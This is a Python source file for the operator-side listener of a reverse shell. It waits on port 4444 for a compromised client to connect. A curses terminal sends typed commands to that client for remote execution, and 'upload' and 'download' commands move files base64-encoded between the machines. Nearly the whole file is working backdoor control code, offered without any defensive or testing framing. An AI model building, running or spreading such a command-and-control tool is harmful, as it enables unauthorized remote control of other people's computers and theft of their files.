#!/usr/bin/python
# General - Connection to the client, able to send and recieve data. Testing on port 4444.
# General - json is used to manage serilisation to receive large data.


import socket
import json
import base64
import curses
# import time

class Listr:

    comm = ""
    lt_comm_ = []
    idx = 0

    cli_pad_y = 5000 # Column size

    def __init__(self, addr, prt):
        listr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # The bellow is to reuse a connection if it doesn't go down with the connection to.
        listr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        print(addr)
        listr.bind((addr, prt))
        listr.listen(0)
        print("Connecting...") #testing
        self.conn, self.addrs = listr.accept()
        print("\nConnected to " + str(self.addrs) + "\n") #testing
    

    def main_curses(self):
        curses.wrapper(self.run)


    def send_data(self, data):
#        print("\ntype: " + str(type(data)) + " - data: " + str(data) + "\n") #testing
        json_data = json.dumps(data)
#        print("\ntype: " + str(type(json_data)) + " - json_data: " + json_data + "\n") #testing
        self.conn.sendall(json_data.encode())


    def rcve_data(self):
        json_data = ""
        while True:
            try:
#                print("exit 0") #testing
                json_data += self.conn.recv(1024).decode() # plus sign is necessary.
                if json_data == "" or json_data == b'':
#                   print("break: " + str(json_data)) #testing
                    break
#               print("exit 1" + " - json_data: " + str(json_data)) #testing
                return json.loads(json_data)
            except ValueError:               
                continue


    def exe_rmy(self, comm):
        self.send_data(comm)
        return self.rcve_data()


    def w_f(self, path, item):
        with open(path, "wb") as f:
            f.write(base64.b64decode(item))
            return "\nDownloaded"
    

    def r_f(self, path):
        # only r read plain text, with b reads binary. e.g.: open(path, "rb")
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode()


    def run(self, cole):
        right_left = 0 # Index to go through the string that is typed (buff_ch)
        hist = ""
        buff_ch = ""
        output_comm__ = ""
        buff_com = [''] # History commands
        cur_yx__ = [0, 0] # Store the cursor's position
        (coley, colex) = cole.getmaxyx()
        cli_p = curses.newpad(self.cli_pad_y, colex - 3)
        cli_p.scrollok(True)
        cli_p.idlok(True)
        cli_p.keypad(True)
        try:
            cli_p.clear()
            cli_p.addstr(self.cli_pad_y - coley, 0, str(self.addrs) + "$ " + buff_ch)
            (cur_yx__[0], cur_yx__[1]) = cli_p.getyx() # updating cursor's position

            while True:
                
                cli_p.refresh(self.cli_pad_y - coley, 0, 0, 0, coley - 1, colex - 3)

                #Capturing the input
                # The main 'enter' key retrieve 10, whereas the another 'enter' key 343 which
                # is the value that's working. (??)
                # Using get_wch make use of capturing a wide form of charater, that includs the special ones.
                inp_ch = (lambda input: curses.KEY_ENTER if input == 10 or input == '\n' else input)(cli_p.get_wch())
                
                # Checking if the size of the windows changed
                (coley_c, colex_c) = cole.getmaxyx()
                if coley_c != coley or colex_c != colex:
                    (coley, colex) = (coley_c, colex_c)
                    # cli_p.addstr("testing... rezising")
                    cli_p.resize(self.cli_pad_y, colex - 3)
                    cole.clear()
                    cole.refresh()
                    cli_p.clear()
                    cli_p.addstr(self.cli_pad_y - coley, 0, hist)

                # Handling the scroll
                elif inp_ch == curses.KEY_UP or inp_ch == curses.KEY_DOWN:
                    self.app_k__(cli_p, self.cli_pad_y - coley, inp_ch, coley, colex)
                    continue
                
                # Handling left and right arrows keys to go through the string that is typed (buff_ch)
                elif inp_ch == curses.KEY_LEFT:
                    if right_left > -len(buff_ch):
                        right_left -= 1
                        cli_p.move(cli_p.getyx()[0], cli_p.getyx()[1] - 1)
                        (cur_yx__[0], cur_yx__[1]) = cli_p.getyx() # updating cursor's position
                    continue
                elif inp_ch == curses.KEY_RIGHT:
                    if right_left < 0:
                        right_left += 1
                        cli_p.move(cli_p.getyx()[0], cli_p.getyx()[1] + 1)
                        (cur_yx__[0], cur_yx__[1]) = cli_p.getyx() # updating cursor's position
                    continue

                # Handlig history and command execution
                elif inp_ch == curses.KEY_ENTER:
                    # Managing the output history
                    buff_com[:0] = [buff_ch] # buff_com is the history commands, which will be scrolled.
                    output_comm__ = '\n' + self.s_comm__(buff_ch).replace('\r', '')
                    hist += '\n' + str(self.addrs) + "$ " + buff_ch
                    hist += output_comm__
                    cli_p.addstr(cli_p.getyx()[0] + 1, 0, output_comm__ + '\n' + str(self.addrs) + "$ ")
                    (cur_yx__[0], cur_yx__[1]) = cli_p.getyx() # updating cursor's position
                    buff_ch = ''
                    right_left = 0 # Restart the cursor's index
                    continue

                elif inp_ch == curses.KEY_BACKSPACE:
                    if cur_yx__[1] > len(str(self.addrs) + "$ "):
                        if right_left < 0 and right_left > -len(buff_ch):
                            # Remove a character. checking first if the cursor's index (right_left) has been modify and is not as less as buff_ch
                            # The for loop with the parameters given is working between the length of buff_ch to -1. 
                            # It is given 0 into ranege, however the loop just reach until -1.
                            buff_ch = ''.join([buff_ch[i] for i in range(-len(buff_ch), 0) if i != right_left - 1])
                        elif len(buff_ch) > 0:
                            # If the (right_left) cursor's index equal c 0 so means hasn't been modified.
                            buff_ch = buff_ch[:-1]
                        cur_yx__[1] -= 1 # By every backspace the cursor goes back one position
                # Receiving normal char
                # Make sure the inputs are not special characters.
                elif type(inp_ch) is str and len(inp_ch) == 1:
                    # Make sure the new chars are character between 127 to 31 in ASCII table.
                    if ord(inp_ch) < 127 and ord(inp_ch) > 31:
                        if len(buff_ch) > 0 and right_left < 0:
                            buff_ch = buff_ch[:right_left] + inp_ch + buff_ch[right_left:]
                        else:
                            buff_ch += inp_ch
                        cur_yx__[1] += 1 # By every new char the cursor goes forward one position

                cli_p.deleteln()
                cli_p.addstr(cli_p.getyx()[0], 0, str(self.addrs) + "$ " + buff_ch)
                cli_p.move(cur_yx__[0], cur_yx__[1]) # Sending the cursor onto its current position
                
        except curses.error as cur_err:
            print(cur_err)
            pass

    
    def s_comm__(self, comm):
        try:
            self.comm = comm.split(" ")
            # Here, the file is appended to the file.
            if self.comm[0] == "upload":
                self.comm.append(self.r_f(self.comm[1]))
            result = self.exe_rmy(self.comm)
            # while is to make sure if there is still connection
            while result == None:
                result = self.exe_rmy(self.comm)
            if self.comm[0] == "download" and "[Bad command]" not in result:
                result = self.w_f(self.comm[1], result.encode())
            if "exit" in comm:
                self.send_data("test...")
            return result
        except FileNotFoundError as notfound:
            print(f"\n{notfound.strerror}\n")
        except (BrokenPipeError, ConnectionError) as cnerr:
            print(cnerr.strerror + " - Connection down")
            self.conn.close()
            exit()
        except Exception as excep:
            print("Something went wrong. >>> " + str(excep))


    # scrolling
    def app_k__(self, cli_p, row, input_, y, x):
        max_row = row
        while True:
            if input_ == curses.KEY_UP:
                if row > 0:
                    row -= 1
                cli_p.refresh(row, 0, 0, 0, y - 1, x - 3)
            elif input_ == curses.KEY_DOWN:
                if row < max_row:
                    row += 1
                cli_p.refresh(row, 0, 0, 0, y - 1, x - 3)
            input_ = cli_p.getch()
            if input_ != curses.KEY_UP and input_ != curses.KEY_DOWN:
                break
    

    # def rwl_ku__(self):
    #     if self.idx < len(self.lt_comm_):
    #         print(*self.lt_comm_[self.idx]), print("\b\b\b\b"),
    #         #keyboard.write("\b\b\b\b\b\b\b\b" + ' '.join(self.lt_comm_[self.idx]), delay=0.0)
    #         #print(' '.join(self.lt_comm_[self.idx]) + " up-> " + str(self.idx) + " - len: " + str(len(self.lt_comm_)))
    #         self.idx = self.idx + 1
    

    # def rwl_kd__(self):
    #     if self.idx > 0:
    #         self.idx = self.idx - 1
    #         print(' '.join(self.lt_comm_[self.idx]), end=" ")
    #         # keyboard.write("\b" + ' '.join(self.lt_comm_[self.idx]))
    #         #print(self.lt_comm_[self.idx] + " down-> " + str(self.idx) + " - len: " + str(len(self.lt_comm_)))
    #     elif self.idx == 0:
    #         #keyboard.write("\b\b")
    #         print('\r', end=" ")
            

my_listner = Listr('', 4444)
my_listner.main_curses()